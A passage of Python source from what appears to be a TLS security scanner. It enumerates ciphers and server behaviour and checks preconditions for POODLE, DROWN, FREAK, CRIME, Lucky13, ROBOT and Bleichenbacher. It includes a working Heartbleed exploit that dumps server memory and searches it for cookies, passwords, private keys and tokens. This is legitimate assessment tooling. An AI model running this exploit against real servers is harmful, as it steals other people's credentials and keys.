    target = _current_target()
    emit_header(emit, "FALLBACK_SCSV and renegotiation SCSV behavior")
    r1 = tls_probe(target.host, target.port, 0x0303,
                    DEFAULT_TLS12_CIPHERS + [0x5600],
                    timeout=4.0, sni=target.host)
    sh1 = r1.get("server_hello")
    alerts1 = r1.get("alerts", [])
    fallback_rejected = False
    if sh1:
        fallback_rejected = False
    elif alerts1:
        fallback_rejected = (alerts1[0][1] == 86)
    setk("stage03.scsv.fallback_scsv_rejected", fallback_rejected)
    emit_kv(emit, "fallback_scsv_rejected", str(fallback_rejected),
             OK if fallback_rejected else WARN)
    r2 = tls_probe(target.host, target.port, 0x0303,
                    DEFAULT_TLS12_CIPHERS + [0x00ff],
                    timeout=4.0, sni=target.host)
    sh2 = r2.get("server_hello")
    reneg_ok = bool(sh2 and sh2.ext_by_id(EXT_RENEGOTIATION_INFO))
    setk("stage03.scsv.reneg_scsv_accepted", reneg_ok)
    emit_kv(emit, "reneg_scsv_accepted", str(reneg_ok), OK if reneg_ok else WARN)


def _stage03_compression(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS-level compression method")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "warn", "no ServerHello — compression unknown")
        return
    setk("stage03.compression.method", sh.compression)
    setk("stage03.compression.method_name", compression_name(sh.compression))
    emit_kv(emit, "method_id", str(sh.compression), VALUE)
    emit_kv(emit, "method_name", compression_name(sh.compression), VALUE)
    if sh.compression != 0:
        emit_alert(emit, "vuln", "TLS compression enabled — CRIME precondition")
        setk("vulnerability.crime.detected", True)
        count("vulns")
    else:
        emit_alert(emit, "ok", "TLS compression disabled")


def _stage03_reneg(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "renegotiation support")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        return
    reneg_ext = sh.ext_by_id(EXT_RENEGOTIATION_INFO)
    setk("stage03.reneg.secure_extension", reneg_ext is not None)
    if reneg_ext:
        emit_kv(emit, "secure_reneg", "advertised", OK)
    else:
        emit_kv(emit, "secure_reneg", "not advertised", WARN)


def _stage03_session(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "session resumption: ticket extension and session_id length")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host, session_ticket=b"")
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "warn", "no ServerHello — session resumption unknown")
        return
    sid_len = len(sh.session_id)
    ticket_ext = sh.ext_by_id(EXT_SESSION_TICKET)
    setk("stage03.session.session_id_len", sid_len)
    setk("stage03.session.ticket_extension_seen", ticket_ext is not None)
    emit_kv(emit, "session_id_len", str(sid_len), VALUE)
    emit_kv(emit, "ticket_extension", str(ticket_ext is not None),
             OK if ticket_ext else MUTED)
    ems = sh.ext_by_id(EXT_EXTENDED_MASTER_SECRET)
    setk("stage03.session.ems", ems is not None)
    emit_kv(emit, "extended_master_secret", str(ems is not None),
             OK if ems else WARN)


register_stage(StageSpec(3, "stage_03_protocol_and_cipher", "Protocol & Cipher Enumeration",
    "Enumerates accepted cipher suites per protocol version by iterating real ClientHellos "
    "and pinning ServerHello selection. Detects weak key sizes, NULL/EXPORT/anon ciphers, "
    "RC4, 3DES, CBC-only suites, missing PFS. Enumerates EC curves, signature algorithms, "
    "ALPN, SCSV, TLS compression, renegotiation, session resumption extensions.",
    [
        TestSpec("cipher.enum.tls12", "TLS 1.2 cipher enumeration",
                 _stage03_cipher_enum_tls12, 30.0),
        TestSpec("cipher.enum.tls11", "TLS 1.1 cipher enumeration",
                 _stage03_cipher_enum_tls11, 25.0),
        TestSpec("cipher.enum.tls10", "TLS 1.0 cipher enumeration",
                 _stage03_cipher_enum_tls10, 25.0),
        TestSpec("cipher.enum.ssl3", "SSLv3 cipher enumeration",
                 _stage03_cipher_enum_ssl3, 25.0),
        TestSpec("cipher.enum.tls13", "TLS 1.3 cipher probe",
                 _stage03_cipher_enum_tls13, 20.0),
        TestSpec("cipher.bits.dist", "key size histogram", _stage03_bits_dist, 6.0),
        TestSpec("cipher.kx.dist", "key exchange breakdown", _stage03_kx_dist, 6.0),
        TestSpec("cipher.aead_vs_cbc", "AEAD vs CBC ratio", _stage03_aead_vs_cbc, 6.0),
        TestSpec("cipher.weak", "weak cipher class detection", _stage03_weak, 6.0),
        TestSpec("cipher.preferred", "server cipher preference",
                 _stage03_cipher_preferred, 12.0),
        TestSpec("curve.enum", "EC curve enumeration", _stage03_curve_enum, 30.0),
        TestSpec("curve.preferred", "preferred curve", _stage03_curve_preferred, 12.0),
        TestSpec("sigalg.enum", "signature algorithm enumeration",
                 _stage03_sigalg_enum, 40.0),
        TestSpec("sigalg.weak", "SHA-1/MD5 signature algorithms",
                 _stage03_sigalg_weak, 6.0),
        TestSpec("alpn.enum", "ALPN negotiation", _stage03_alpn_enum, 10.0),
        TestSpec("alpn.h2_pref", "ALPN preference", _stage03_alpn_pref, 20.0),
        TestSpec("scsv.probe", "FALLBACK_SCSV behavior", _stage03_scsv, 12.0),
        TestSpec("compression.probe", "TLS compression method", _stage03_compression, 8.0),
        TestSpec("reneg.probe", "renegotiation support", _stage03_reneg, 15.0),
        TestSpec("session.probe", "session resumption", _stage03_session, 12.0),
    ], 180.0))


def _stage04_heartbeat_probe(host, port, timeout=3.0, sni=None):
    out = {"extension_advertised": None, "response_received": None,
           "response_bytes": 0, "error": ""}
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        hello = build_client_hello(0x0303, DEFAULT_TLS12_CIPHERS, sni=sni,
                                    groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS,
                                    heartbeat=True)
        s.sendall(hello)
        recs, _ = read_tls_records(s, timeout=timeout)
        sh = extract_server_hello(recs)
        if sh is None:
            out["error"] = "no ServerHello"
            return out
        hb_ext = sh.ext_by_id(EXT_HEARTBEAT)
        out["extension_advertised"] = hb_ext is not None
        hb_msg = pack_u8(1) + pack_u16(0)
        payload = struct.pack(">BHH", CT_HEARTBEAT, 0x0303, len(hb_msg)) + hb_msg
        s.sendall(payload)
        try:
            s.settimeout(timeout)
            data = s.recv(4096)
            for rec, _ in [TLSRecord.decode(data, 0)]:
                if rec is None:
                    continue
                if rec.content_type == CT_HEARTBEAT:
                    out["response_received"] = True
                    out["response_bytes"] = len(rec.payload)
                elif rec.content_type == CT_ALERT:
                    out["response_received"] = False
        except socket.timeout:
            out["response_received"] = False
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage04_robot_oracle(host, port, iterations=32, timeout=3.0, sni=None):
    out = {"good_alerts": _StdCounter(), "bad_alerts": _StdCounter(),
           "good_alert": None, "bad_alert": None,
           "distinct_alert": False, "oracle_detected": False, "error": ""}
    rsa_kx_cipher = 0x002f
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        hello = build_client_hello(0x0303, [rsa_kx_cipher], sni=sni,
                                    groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
        s.sendall(hello)
        recs, _ = read_tls_records(s, timeout=timeout)
        sh = extract_server_hello(recs)
        if sh is None or sh.cipher_suite != rsa_kx_cipher:
            out["error"] = "RSA KX not available"
            return out
        cert = extract_certificate(recs)
        if not cert or not cert.certs:
            out["error"] = "no certificate"
            return out
        parsed = parse_der_certificate(cert.certs[0])
        if parsed is None or parsed.rsa_n is None:
            out["error"] = "cannot parse RSA key"
            return out
        n_bytes = (parsed.rsa_n.bit_length() + 7) // 8
        for i in range(iterations):
            use_good = (i % 2 == 0)
            pt = b"\x03\x03" + rand_bytes(46)
            if use_good:
                pad_len = n_bytes - 3 - len(pt)
                if pad_len < 8:
                    continue
                block = b"\x00\x02" + b"\x00" * pad_len + b"\x00" + pt
            else:
                block = b"\x00\x01" + b"\xff" * (n_bytes - 3 - len(pt)) + b"\x00" + pt
            ct = pow(bytes_to_long(block), parsed.rsa_e, parsed.rsa_n).to_bytes(n_bytes, "big")
            try:
                cke_body = pack_u16(len(ct)) + ct
                cke = pack_u8(16) + pack_u24(len(cke_body)) + cke_body
                s.sendall(struct.pack(">BHH", CT_HANDSHAKE, 0x0303, len(cke)) + cke)
                s.settimeout(1.5)
                data = s.recv(1024)
                desc = None
                for rec, _ in [TLSRecord.decode(data, 0)]:
                    if rec and rec.content_type == CT_ALERT and len(rec.payload) >= 2:
                        desc = rec.payload[1]
                if use_good:
                    out["good_alerts"][desc] += 1
                else:
                    out["bad_alerts"][desc] += 1
            except Exception:
                continue
        gt = out["good_alerts"].most_common(1)
        bt = out["bad_alerts"].most_common(1)
        if gt:
            out["good_alert"] = gt[0][0]
        if bt:
            out["bad_alert"] = bt[0][0]
        if gt and bt:
            out["distinct_alert"] = (gt[0][0] != bt[0][0])
            out["oracle_detected"] = out["distinct_alert"]
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage04_cbc_gcm_timing(host, port, samples=40, timeout=4.0, sni=None):
    out = {"cbc": [], "gcm": [], "test": {}}
    cbc_ciphers = [0xc013, 0xc014, 0x002f, 0x0035]
    gcm_ciphers = [0xc02f, 0xc030, 0xc02b, 0xc02c]
    for _ in range(samples):
        t0 = time.perf_counter()
        try:
            r = tls_probe(host, port, 0x0303, cbc_ciphers, timeout=timeout, sni=sni)
            if r.get("server_hello") is not None:
                out["cbc"].append((time.perf_counter() - t0) * 1e6)
        except Exception:
            pass
        t0 = time.perf_counter()
        try:
            r = tls_probe(host, port, 0x0303, gcm_ciphers, timeout=timeout, sni=sni)
            if r.get("server_hello") is not None:
                out["gcm"].append((time.perf_counter() - t0) * 1e6)
        except Exception:
            pass
    a, b = out["cbc"], out["gcm"]
    if len(a) >= 5 and len(b) >= 5:
        ma = statistics.mean(a)
        mb = statistics.mean(b)
        va = statistics.variance(a)
        vb = statistics.variance(b)
        na, nb = len(a), len(b)
        se = math.sqrt(va / na + vb / nb)
        if se > 0:
            t = (ma - mb) / se
            out["test"] = {"t": t, "mean_a": ma, "mean_b": mb,
                            "delta_us": abs(ma - mb),
                            "significant": abs(t) > 3.0}
    return out


def _stage04_bleichenbacher_probe(host, port, timeout=3.0, sni=None):
    out = {"good_alerts": _StdCounter(), "bad_alerts": _StdCounter(),
           "distinct": False, "error": ""}
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        hello = build_client_hello(0x0303, [0x0035, 0x002f], sni=sni,
                                    groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
        s.sendall(hello)
        recs, _ = read_tls_records(s, timeout=timeout)
        sh = extract_server_hello(recs)
        if sh is None:
            out["error"] = "no ServerHello"
            return out
        cert = extract_certificate(recs)
        if not cert or not cert.certs:
            out["error"] = "no certificate"
            return out
        parsed = parse_der_certificate(cert.certs[0])
        if parsed is None or parsed.rsa_n is None or parsed.rsa_e is None:
            out["error"] = "cannot extract RSA public key"
            return out
        n_bytes = (parsed.rsa_n.bit_length() + 7) // 8
        pt = b"\x03\x03" + rand_bytes(46)
        good_pad = n_bytes - 3 - len(pt)
        if good_pad < 8:
            out["error"] = "modulus too small"
            return out
        good_block = b"\x00\x02" + b"\x00" * good_pad + b"\x00" + pt
        bad_block = b"\x00\x01" + b"\xff" * (n_bytes - 3 - len(pt)) + b"\x00" + pt
        for block, bucket in ((good_block, "good_alerts"), (bad_block, "bad_alerts")):
            ct = pow(bytes_to_long(block), parsed.rsa_e, parsed.rsa_n).to_bytes(n_bytes, "big")
            for _ in range(4):
                try:
                    cke_body = pack_u16(len(ct)) + ct
                    cke = pack_u8(16) + pack_u24(len(cke_body)) + cke_body
                    s.sendall(struct.pack(">BHH", CT_HANDSHAKE, 0x0303, len(cke)) + cke)
                    s.settimeout(1.5)
                    data = s.recv(1024)
                    desc = None
                    for rec, _ in [TLSRecord.decode(data, 0)]:
                        if rec and rec.content_type == CT_ALERT and len(rec.payload) >= 2:
                            desc = rec.payload[1]
                    out[bucket][desc] += 1
                except Exception:
                    break
        gt = out["good_alerts"].most_common(1)
        bt = out["bad_alerts"].most_common(1)
        if gt and bt:
            out["distinct"] = (gt[0][0] != bt[0][0])
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage04_ssl3_probe(host, port, timeout=4.0, sni=None):
    out = {"ssl3_accepted": False, "cbc_available": False,
           "cipher_used": None, "error": ""}
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        cbc_ssl3 = [0x000a, 0x0005, 0x0004, 0x0035, 0x002f, 0xc013, 0xc014, 0xc012]
        hello = build_client_hello(0x0300, cbc_ssl3, sni=sni,
                                    groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
        s.sendall(hello)
        recs, _ = read_tls_records(s, timeout=timeout)
        sh = extract_server_hello(recs)
        if sh is None:
            out["error"] = "SSLv3 rejected"
            return out
        out["ssl3_accepted"] = True
        out["cipher_used"] = sh.cipher_suite
        nm = cipher_name(sh.cipher_suite).upper()
        if "CBC" in nm or ("SHA" in nm and "GCM" not in nm and "CHACHA" not in nm):
            out["cbc_available"] = True
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage04_ssl2_probe(host, port, timeout=3.0):
    out = {"accepted": False, "bytes": 0, "error": ""}
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        s.sendall(build_ssl2_client_hello())
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) >= 16:
                    break
            except socket.timeout:
                break
        out["bytes"] = len(data)
        if data and data[0] & 0x80:
            out["accepted"] = True
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage04_export_ciphers(host, port, timeout=3.0, sni=None):
    out = {"accepted": [], "alerts": {}}
    export_ciphers = [0x0003, 0x0006, 0x0008, 0x000b, 0x000e, 0x0011, 0x0014, 0x0017,
                      0x0019, 0x0001, 0x0002]
    for ver_label, ver in (("tls10", 0x0301), ("tls11", 0x0302), ("tls12", 0x0303)):
        r = tls_probe(host, port, ver, export_ciphers, timeout=timeout, sni=sni)
        sh = r.get("server_hello")
        if sh and sh.cipher_suite in export_ciphers:
            out["accepted"].append({"version": ver_label,
                                     "cipher": sh.cipher_suite,
                                     "name": cipher_name(sh.cipher_suite)})
        for a in r.get("alerts", []):
            out["alerts"][a[2]] = out["alerts"].get(a[2], 0) + 1
    return out


def _stage04_rc4_probe(host, port, timeout=3.0, sni=None):
    out = {"rc4_accepted": False, "cipher_used": None, "error": ""}
    rc4_ciphers = [0x0005, 0x0004, 0xc007, 0xc011, 0xc002, 0xc00c, 0xc016]
    r = tls_probe(host, port, 0x0303, rc4_ciphers, timeout=timeout, sni=sni,
                   groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
    sh = r.get("server_hello")
    if sh and sh.cipher_suite in rc4_ciphers:
        out["rc4_accepted"] = True
        out["cipher_used"] = sh.cipher_suite
    elif not sh:
        out["error"] = "no ServerHello"
    else:
        out["error"] = "no RC4 negotiated"
    return out


def _stage04_dh_params(host, port, timeout=4.0, sni=None):
    out = {"p_bits": None, "g": None, "p_probable_prime": None,
           "p_smoothness_risk": False, "small_subgroup_risk": False, "error": ""}
    dhe_ciphers = [0x0033, 0x0039, 0x0067, 0x006b, 0x009e, 0x009f, 0x0016, 0x0013]
    r = tls_probe(host, port, 0x0303, dhe_ciphers, timeout=timeout, sni=sni,
                   groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
    ske = r.get("ske")
    if ske is None or not ske.dh_p:
        out["error"] = "no DHE ServerKeyExchange"
        return out
    p = bytes_to_long(ske.dh_p)
    g = bytes_to_long(ske.dh_g)
    out["p_bits"] = p.bit_length()
    out["g"] = g
    try:
        out["p_probable_prime"] = is_probable_prime(p, rounds=8)
    except Exception:
        pass
    small = 0
    for q in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73]:
        if (p - 1) % q == 0:
            small += 1
    out["p_smoothness_risk"] = small >= 8
    out["small_subgroup_risk"] = dh_small_subgroup_check(p, g)
    return out


def _stage04_ecdh_invalid_probe(host, port, timeout=4.0, sni=None):
    out = {"accepted_unknown_group": False, "server_alert": None}
    r = tls_probe(host, port, 0x0303, [0xc02f, 0xc030, 0xc02b, 0xc02c],
                   timeout=timeout, sni=sni, groups=[0x0f0f, 0x0f10, 0x0f11],
                   sig_algs=DEFAULT_SIG_ALGS)
    sh = r.get("server_hello")
    alerts = r.get("alerts", [])
    if sh is not None:
        out["accepted_unknown_group"] = True
    elif alerts:
        out["server_alert"] = alerts[0]
    return out


def _stage04_ecdsa_sigs(host, port, samples=6, timeout=4.0, sni=None):
    sigs = []
    for _ in range(samples):
        r = tls_probe(host, port, 0x0303,
                       [0xc02b, 0xc02c, 0xc023, 0xc024, 0xc009, 0xc00a],
                       timeout=timeout, sni=sni, groups=[23, 24, 25, 29],
                       sig_algs=[0x0403, 0x0503, 0x0603])
        ske = r.get("ske")
        if ske and ske.signature:
            sigs.append({"alg_name": ske.signature_alg_name,
                          "signature_hex": ske.signature.hex(),
                          "sig_len": len(ske.signature)})
    return sigs


def _stage04_heartbleed_probe(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending ClientHello with heartbeat extension, then heartbeat request")
    r = _stage04_heartbeat_probe(target.host, target.port, timeout=4.0, sni=target.host)
    if r.get("error"):
        emit_alert(emit, "warn", "probe error: " + r["error"])
        setk("stage04.heartbleed.probe.error", r["error"])
        return
    setk("stage04.heartbleed.extension_advertised", r["extension_advertised"])
    setk("stage04.heartbleed.response_received", r["response_received"])
    setk("stage04.heartbleed.response_bytes", r["response_bytes"])
    emit_kv(emit, "heartbeat_ext",
             "advertised" if r["extension_advertised"] else "absent",
             OK if r["extension_advertised"] else MUTED)
    emit_kv(emit, "response_received", str(r["response_received"]),
             OK if r["response_received"] else MUTED)
    emit_kv(emit, "response_bytes", str(r["response_bytes"]))
    if r["response_received"]:
        emit_alert(emit, "info", "server responded to heartbeat — protocol alive")
    else:
        emit_alert(emit, "ok", "no heartbeat response — patched or ignoring heartbeat")


def _stage04_heartbleed_dump(emit, setk, kb):
    emit_header(emit, "sending 32 heartbeat requests with 16KB claimed length")
    target = _current_target()
    s = None
    leaked = b""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        hello = build_client_hello(0x0303, DEFAULT_TLS12_CIPHERS, sni=target.host,
                                    groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS,
                                    heartbeat=True)
        s.sendall(hello)
        recs, _ = read_tls_records(s, timeout=4.0)
        sh = extract_server_hello(recs)
        if not sh or sh.ext_by_id(EXT_HEARTBEAT) is None:
            emit_alert(emit, "info", "heartbeat extension not advertised")
            setk("stage04.heartbleed.dump.skipped", True)
            return
        for i in range(32):
            body = pack_u8(1) + pack_u16(16384) + (b"A" * 16381)
            payload = struct.pack(">BHH", CT_HEARTBEAT, 0x0303, len(body)) + body
            try:
                s.sendall(payload)
                s.settimeout(2.0)
                data = s.recv(65535)
            except Exception:
                continue
            if not data:
                continue
            off = 0
            while True:
                rec, off2 = TLSRecord.decode(data, off)
                if rec is None:
                    break
                off = off2
                if rec.content_type == CT_HEARTBEAT and len(rec.payload) >= 3:
                    claimed = unpack_u16(rec.payload, 1)
                    chunk = rec.payload[3:3 + claimed]
                    if len(chunk) > 16381:
                        leaked += chunk[16381:]
        setk("stage04.heartbleed.dump.total_bytes", len(leaked))
        setk("stage04.heartbleed.dump.raw_bytes", leaked.hex()[:2048])
        emit_kv(emit, "leaked_bytes_total", str(len(leaked)),
                 DANGER if leaked else OK)
        if leaked:
            emit_hex(emit, "leaked_preview", leaked, 128, 8)
            markers = []
            for m in (b"Cookie", b"Authorization", b"password", b"session",
                      b"BEGIN PRIVATE KEY", b"Bearer", b"api_key", b"SECRET"):
                if m in leaked:
                    markers.append(m.decode("ascii", "replace"))
            setk("stage04.heartbleed.dump.markers", markers)
            for m in markers:
                emit_kv(emit, "marker", m, DANGER)
            if markers:
                emit_alert(emit, "exploit",
                           "sensitive material leaked from server memory")
                count("exploits")
                count("vulns")
                setk("vulnerability.heartbleed.detected", True)
            else:
                emit_alert(emit, "warn",
                           "leaked bytes present but no known sensitive markers")
        else:
            emit_alert(emit, "ok", "no memory leaked")
    except Exception as e:
        emit_alert(emit, "warn", "dump failed: " + str(e))
        setk("stage04.heartbleed.dump.error", str(e)[:120])
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage04_robot(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ROBOT PKCS#1v1.5 padding oracle (32 iterations)")
    r = _stage04_robot_oracle(target.host, target.port, iterations=32,
                               timeout=4.0, sni=target.host)
    if r.get("error"):
        emit_alert(emit, "info", "ROBOT not applicable: " + r["error"])
        setk("stage04.robot.applicable", False)
        return
    setk("stage04.robot.applicable", True)
    setk("stage04.robot.good_alert", r["good_alert"])
    setk("stage04.robot.bad_alert", r["bad_alert"])
    setk("stage04.robot.distinct_response", r["distinct_alert"])
    setk("stage04.robot.oracle_detected", r["oracle_detected"])
    emit_kv(emit, "good_padding_alert",
             "%s %s" % (r["good_alert"],
                        alert_name(r["good_alert"]) if r["good_alert"] is not None else ""),
             VALUE)
    emit_kv(emit, "bad_padding_alert",
             "%s %s" % (r["bad_alert"],
                        alert_name(r["bad_alert"]) if r["bad_alert"] is not None else ""),
             VALUE)
    emit_kv(emit, "distinct_response", str(r["distinct_alert"]),
             DANGER if r["distinct_alert"] else OK)
    if r["oracle_detected"]:
        emit_alert(emit, "vuln", "ROBOT oracle signature detected")
        count("vulns")
        setk("vulnerability.robot.detected", True)
    else:
        emit_alert(emit, "ok", "no padding oracle — uniform response")


def _stage04_lucky13(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "Lucky13 CBC vs GCM timing (40 samples each, real Welch t-test)")
    r = _stage04_cbc_gcm_timing(target.host, target.port, samples=40,
                                 timeout=4.0, sni=target.host)
    setk("stage04.lucky13.cbc_samples", len(r["cbc"]))
    setk("stage04.lucky13.gcm_samples", len(r["gcm"]))
    t = r.get("test", {})
    if t.get("mean_a") is not None:
        setk("stage04.lucky13.t_statistic", t.get("t"))
        setk("stage04.lucky13.delta_us", t.get("delta_us"))
        setk("stage04.lucky13.significant", t.get("significant"))
        emit_kv(emit, "cbc_samples", str(len(r["cbc"])), BRAND)
        emit_kv(emit, "gcm_samples", str(len(r["gcm"])), BRAND)
        emit_kv(emit, "cbc_mean_us", "%.1f" % t["mean_a"], VALUE)
        emit_kv(emit, "gcm_mean_us", "%.1f" % t["mean_b"], VALUE)
        emit_kv(emit, "delta_us", "%.1f" % t["delta_us"], BRAND)
        emit_kv(emit, "t_statistic", "%.3f" % t["t"],
                 WARN if t["significant"] else OK)
        if t["significant"]:
            emit_alert(emit, "warn",
                       "significant CBC vs GCM timing difference — Lucky13-class oracle possible")
            count("vulns")
            setk("vulnerability.lucky13.signal", True)
        else:
            emit_alert(emit, "ok", "no significant timing separation")
    else:
        emit_alert(emit, "warn", "insufficient samples for statistical test")


def _stage04_bleichenbacher(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "Bleichenbacher CCA — good vs bad PKCS#1v1.5 padding")
    r = _stage04_bleichenbacher_probe(target.host, target.port, timeout=4.0,
                                       sni=target.host)
    if r.get("error"):
        emit_alert(emit, "info", "not applicable: " + r["error"])
        setk("stage04.bleichenbacher.applicable", False)
        return
    setk("stage04.bleichenbacher.good_alerts", dict(r["good_alerts"]))
    setk("stage04.bleichenbacher.bad_alerts", dict(r["bad_alerts"]))
    setk("stage04.bleichenbacher.distinct", r["distinct"])
    for alert, cnt in r["good_alerts"].items():
        emit_kv(emit, "good_alert_%s" % alert, str(cnt), VALUE)
    for alert, cnt in r["bad_alerts"].items():
        emit_kv(emit, "bad_alert_%s" % alert, str(cnt), VALUE)
    if r["distinct"]:
        emit_alert(emit, "vuln",
                   "padding class distinguishable — Bleichenbacher CCA surface")
        count("vulns")
        setk("vulnerability.bleichenbacher.detected", True)
    else:
        emit_alert(emit, "ok", "uniform alert response — no obvious padding oracle")


def _stage04_poodle(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "POODLE precondition: SSLv3 + CBC")
    r = _stage04_ssl3_probe(target.host, target.port, timeout=4.0, sni=target.host)
    setk("stage04.poodle.ssl3_accepted", r["ssl3_accepted"])
    setk("stage04.poodle.cbc_available", r["cbc_available"])
    setk("stage04.poodle.cipher_used", r["cipher_used"])
    emit_kv(emit, "ssl3_accepted", str(r["ssl3_accepted"]),
             DANGER if r["ssl3_accepted"] else OK)
    if r["cipher_used"]:
        emit_kv(emit, "cipher_negotiated",
                 "0x%04x  %s" % (r["cipher_used"], cipher_name(r["cipher_used"])),
                 DANGER if r["cbc_available"] else WARN)
    emit_kv(emit, "cbc_mode_available", str(r["cbc_available"]),
             DANGER if r["cbc_available"] else OK)
    if r["ssl3_accepted"] and r["cbc_available"]:
        emit_alert(emit, "vuln", "POODLE precondition met: SSLv3 + CBC")
        count("vulns")
        setk("vulnerability.poodle.detected", True)
    elif r["ssl3_accepted"]:
        emit_alert(emit, "warn", "SSLv3 accepted but no CBC negotiated")
    else:
        emit_alert(emit, "ok", "SSLv3 disabled")


def _stage04_drown(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "DROWN precondition: SSLv2 ClientHello on target port")
    r = _stage04_ssl2_probe(target.host, target.port, timeout=3.0)
    setk("stage04.drown.ssl2_accepted", r["accepted"])
    setk("stage04.drown.response_bytes", r["bytes"])
    emit_kv(emit, "ssl2_accepted", str(r["accepted"]),
             DANGER if r["accepted"] else OK)
    emit_kv(emit, "response_bytes", str(r["bytes"]))
    if r["accepted"]:
        emit_alert(emit, "vuln", "SSLv2 accepted — DROWN precondition met")
        count("vulns")
        setk("vulnerability.drown.detected", True)
    else:
        emit_alert(emit, "ok", "SSLv2 not accepted")


def _stage04_freak_logjam(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "FREAK / Logjam export cipher acceptance")
    r = _stage04_export_ciphers(target.host, target.port, timeout=4.0, sni=target.host)
    accepted = r["accepted"]
    setk("stage04.freak.export_accepted", accepted)
    setk("stage04.freak.alerts", dict(r["alerts"]))
    emit_kv(emit, "export_ciphers_accepted", str(len(accepted)),
             DANGER if accepted else OK)
    for a in accepted:
        emit_kv(emit, a["version"],
                 "0x%04x  %s" % (a["cipher"], a["name"]), DANGER)
    if accepted:
        emit_alert(emit, "vuln", "export cipher accepted — FREAK/Logjam surface")
        count("vulns")
        setk("vulnerability.freak.detected", True)
    else:
        emit_alert(emit, "ok", "no export ciphers accepted")


def _stage04_rc4(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "RC4 acceptance")
    r = _stage04_rc4_probe(target.host, target.port, timeout=4.0, sni=target.host)
    setk("stage04.rc4.accepted", r["rc4_accepted"])
    setk("stage04.rc4.cipher_used", r["cipher_used"])
    emit_kv(emit, "rc4_accepted", str(r["rc4_accepted"]),
             DANGER if r["rc4_accepted"] else OK)
    if r["cipher_used"]:
        emit_kv(emit, "cipher_negotiated",
                 "0x%04x  %s" % (r["cipher_used"], cipher_name(r["cipher_used"])), DANGER)
    if r["rc4_accepted"]:
        emit_alert(emit, "vuln", "RC4 negotiated")
        count("vulns")
        setk("vulnerability.rc4.detected", True)
    else:
        emit_alert(emit, "ok", "RC4 not accepted")


def _stage04_crime(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "CRIME precondition: TLS compression method")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "warn", "no ServerHello")
        return
    enabled = sh.compression != 0
    setk("stage04.crime.compression_method", sh.compression)
    setk("stage04.crime.enabled", enabled)
    emit_kv(emit, "compression_method", str(sh.compression), VALUE)
    emit_kv(emit, "compression_name", compression_name(sh.compression), VALUE)
    emit_kv(emit, "enabled", str(enabled), DANGER if enabled else OK)
    if enabled:
        emit_alert(emit, "vuln", "TLS compression enabled — CRIME surface")
        count("vulns")
        setk("vulnerability.crime.detected", True)
    else:
        emit_alert(emit, "ok", "TLS compression disabled")


def _stage04_beast(emit, setk, kb):
    emit_header(emit, "BEAST precondition: TLS 1.0 + CBC")
    tls10 = kb.get("stage03.cipher.tls10.accepted") or []
    cbc_tls10 = [c for c in tls10 if "CBC" in cipher_name(c).upper()]
    setk("stage04.beast.tls10_accepted", bool(tls10))
    setk("stage04.beast.cbc_tls10_count", len(cbc_tls10))
